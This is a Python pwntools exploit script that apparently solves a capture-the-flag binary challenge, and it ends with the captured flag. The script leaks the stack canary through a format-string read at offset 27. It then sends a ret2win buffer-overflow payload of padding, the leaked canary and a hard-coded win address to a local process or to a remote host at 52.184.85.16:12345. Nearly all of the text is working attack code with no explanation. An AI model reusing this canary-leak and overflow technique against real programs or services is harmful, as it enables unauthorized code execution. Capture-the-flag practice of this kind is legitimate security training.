# Arch:       amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

from pwn import *

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)
    
def fuzz_canary():
    for i in range(27, 28): #got canary at offset + 27
        p = conn()
        if args.REMOTE:
            p.sendline(b"13523090")
            p.sendline(b"5")

        p.sendline(f'%{i}$p'.encode())
        print(f"{i}: {p.recvline()}")
        
    p.close()

def solve(): 
    p = conn()
    if args.REMOTE:
        p.sendline(b"13523090")
        p.sendline(b"5")

    exe = './5'
    context.binary = ELF(exe, checksec=False)
    context.log_level = 'debug'

    # fuzzing to get canary
    fuzz_canary()

    #got canary at offset + 27

    # Attack goes here
    win_addr = 0x000000000040144c               # disas win
    offset = 168

    p.sendline('%{}$p'.format(27).encode())
    canary = int(p.recvline().strip().split()[-1], 16)  # Get leaked canary
    print(f"canony {hex(canary)}")
    info('canary = 0x%x (%d)', canary, canary)

    # ret2win
    payload = flat([
        b'A' * offset,  # Pad to canary
        canary,         # Our leaked canary
        b'B' * 8,       # Pad to Ret pointer
        p64(win_addr)   # win address
    ])

    p.sendline(payload)
    p.interactive()

solve()

# Orkom3{You have 10 seconds â€” 10, 9...1!_9342882aff8d6b66}